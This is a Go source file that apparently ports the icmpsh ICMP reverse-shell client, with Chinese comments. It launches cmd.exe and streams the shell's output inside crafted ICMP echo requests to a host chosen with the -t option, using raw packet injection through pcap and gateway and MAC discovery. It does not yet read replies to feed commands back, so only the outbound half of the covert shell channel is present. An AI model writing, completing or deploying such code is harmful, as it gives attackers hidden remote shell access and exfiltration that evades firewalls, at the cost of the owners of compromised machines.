package main

import (
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

const (
	DefaultDelay       = 200
	DefaultTimeout     = 3000
	DefaultMaxBlanks   = 10
	DefaultMaxDataSize = 64
)

var (
	target      string
	isTest      bool
	delay       int
	timeout     int
	maxBlanks   int
	maxDataSize int
)

func init() {
	// 2. 绑定参数到变量，并提供默认值和说明
	flag.StringVar(&target, "t", "", "host ip address to send ping requests to")
	flag.BoolVar(&isTest, "r", false, "send a single test icmp request and then quit")
	flag.IntVar(&delay, "d", DefaultDelay, "delay between requests in milliseconds")
	flag.IntVar(&timeout, "o", DefaultTimeout, "timeout in milliseconds")
	flag.IntVar(&maxBlanks, "b", DefaultMaxBlanks, "maximal number of blanks (unanswered icmp requests)\nbefore quitting")
	flag.IntVar(&maxDataSize, "s", DefaultMaxDataSize, "maximal data buffer size in bytes")

	// 3. 重写 flag.Usage 自定义帮助文档的输出格式
	// 当用户输入 -h 或者输入了错误的参数时，会自动调用这个函数
	flag.Usage = func() {
		// os.Args[0] 就是当前执行程序的路径，对标 C 语言传入的 path
		fmt.Fprintf(os.Stderr, "%s [options] -t target\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "options:\n")

		// 打印各个参数的详细说明
		fmt.Fprintf(os.Stderr, "  -t host            host ip address to send ping requests to\n")
		fmt.Fprintf(os.Stderr, "  -r                 send a single test icmp request and then quit\n")
		fmt.Fprintf(os.Stderr, "  -d milliseconds    delay between requests in milliseconds (default is %d)\n", DefaultDelay)
		fmt.Fprintf(os.Stderr, "  -o milliseconds    timeout in milliseconds\n")
		fmt.Fprintf(os.Stderr, "  -h                 this screen\n")
		fmt.Fprintf(os.Stderr, "  -b num             maximal number of blanks (unanswered icmp requests)\n")
		fmt.Fprintf(os.Stderr, "                     before quitting\n")
		fmt.Fprintf(os.Stderr, "  -s bytes           maximal data buffer size in bytes (default is %d bytes)\n\n", DefaultMaxDataSize)

		// 打印结尾的提示语
		fmt.Fprintf(os.Stderr, "In order to improve the speed, lower the delay (-d) between requests or\n")
		fmt.Fprintf(os.Stderr, "increase the size (-s) of the data buffer\n")
	}
	// 4. 执行解析
	flag.Parse()
	// 5. 业务逻辑判断：如果必填项没填，主动调用 Usage() 提示用户并退出
	if target == "" {
		fmt.Println("you need to specify a host with -t. Try -h for more options")
		os.Exit(1)
	}
	// 打印解析结果测试
	fmt.Printf("启动配置 -> Target: %s, Delay: %d, TestMode: %v\n", target, delay, isTest)
}

func createShell() (stdin io.WriteCloser, stdout io.ReadCloser, err error) {
	cmd := exec.Command("cmd.exe")

	stdout, err = cmd.StdoutPipe()
	if err != nil {
		return nil, nil, err
	}
	cmd.Stderr = cmd.Stdout
	stdin, err = cmd.StdinPipe()
	if err != nil {
		return nil, nil, err
	}
	if err := cmd.Start(); err != nil {
		return nil, nil, err
	}
	return stdin, stdout, nil
}

func startPipeReader(outReader io.ReadCloser, outChan chan []byte) {
	buf := make([]byte, DefaultMaxDataSize)
	for {
		n, err := outReader.Read(buf)
		if err != nil {
			close(outChan)
			return
		}
		if n > 0 {
			outChan <- buf[:n]
		}
	}
}

// getDefaultGateway 从路由表中解析默认网关 IP
func getDefaultGateway() (string, error) {
	cmd := exec.Command("cmd", "/c", "route print 0.0.0.0")
	out, err := cmd.Output()
	if err != nil {
		return "", err
	}
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		if len(fields) >= 3 && fields[0] == "0.0.0.0" {
			return fields[2], nil // 第三个字段通常是网关 IP
		}
	}
	return "", errors.New("gateway not found")
}

// getMacByIP 从系统的 ARP 缓存表中解析指定 IP 的 MAC 地址
func getMacByIP(ip string) (net.HardwareAddr, error) {
	cmd := exec.Command("arp", "-a")
	out, _ := cmd.Output()
	lines := strings.Split(string(out), "\n")
	for _, line := range lines {
		fields := strings.Fields(line)
		// 必须至少有3个字段，且第一个字段严格等于目标IP
		if len(fields) < 2 {
			continue
		}
		if fields[0] != ip {
			continue
		}
		macStr := strings.ReplaceAll(fields[1], "-", ":")
		mac, err := net.ParseMAC(macStr)
		if err != nil {
			// 跳过解析失败的行，继续找
			continue
		}
		return mac, nil
	}
	return nil, errors.New("mac not found in arp cache for " + ip)
}

// getNextHopMAC 智能判断并获取下一跳（局域网目标或网关）的 MAC 地址
func getNextHopMAC(srcIP, dstIP net.IP) (net.HardwareAddr, error) {
	isLocal := false
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok {
				if ipnet.IP.Equal(srcIP) && ipnet.Contains(dstIP) {
					isLocal = true
					break
				}
			}
		}
	}
	targetIP := dstIP.String()
	if !isLocal { // 如果目标在外网，则查找默认网关
		gw, err := getDefaultGateway()
		if err != nil {
			return nil, err
		}
		targetIP = gw
	}
	// 神之一手：给目标或网关发一个 UDP 空连接，强行唤醒操作系统的 ARP 机制，确保 ARP 表里一定有它的 MAC
	conn, _ := net.Dial("udp", targetIP+":53")
	if conn != nil {
		conn.Close()
	}
	return getMacByIP(targetIP)
}
func sendICMP(dstIP string, data []byte) error {
	dst := net.ParseIP(dstIP)
	conn, _ := net.Dial("udp", dstIP+":80")
	srcIP := conn.LocalAddr().(*net.UDPAddr).IP
	conn.Close()
	// 1. 自动获取本机源 MAC 地址 (SrcMAC)
	var srcMAC net.HardwareAddr
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		addrs, _ := i.Addrs()
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && ipnet.IP.Equal(srcIP) {
				srcMAC = i.HardwareAddr
				break
			}
		}
	}
	// 2. 自动获取下一跳(网关或目标)的 MAC 地址 (DstMAC)
	dstMAC, err := getNextHopMAC(srcIP, dst)
	if err != nil {
		return fmt.Errorf("自动获取目标 MAC 失败: %v", err)
	}
	// 找到对应的网卡并打开
	ifs, _ := pcap.FindAllDevs()
	var device string
	for _, iface := range ifs {
		for _, addr := range iface.Addresses {
			if addr.IP.Equal(srcIP) {
				device = iface.Name
				break
			}
		}
	}
	handle, err := pcap.OpenLive(device, 65536, true, pcap.BlockForever)
	if err != nil {
		return err
	}
	defer handle.Close()
	// 3. 构造以太网头部 (成功补全)
	eth := &layers.Ethernet{
		SrcMAC:       srcMAC,
		DstMAC:       dstMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}
	// 后续逻辑保持不变，记得把 eth 放进序列化函数里
	icmp := &layers.ICMPv4{
		TypeCode: layers.CreateICMPv4TypeCode(layers.ICMPv4TypeEchoRequest, 0),
		Id:       1,
		Seq:      1,
	}
	ip := &layers.IPv4{
		SrcIP:    srcIP,
		DstIP:    dst,
		Protocol: layers.IPProtocolICMPv4,
		Version:  4,
		TTL:      64,
	}
	buffer := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	payload := gopacket.Payload(data)
	// ⚠️ 把 eth 加到序列化列表的最前面
	gopacket.SerializeLayers(buffer, opts, eth, ip, icmp, payload)
	return handle.WritePacketData(buffer.Bytes())
}

func main() {
	stdin, stdout, err := createShell()
	if err != nil {
		fmt.Println("createShell error:", err)
		return
	}
	defer stdin.Close()
	defer stdout.Close()

	outChan := make(chan []byte, 100)

	go startPipeReader(stdout, outChan)
	for {
		//从cmd读取输出
		var outBuf []byte
		select {
		case data := <-outChan:
			outBuf = data
		default:
			outBuf = nil
		}
		fmt.Println(string(outBuf))

		err := sendICMP(target, outBuf)
		if err != nil {
			panic(err)
		}

		time.Sleep(time.Duration(delay) * time.Millisecond)
	}

}
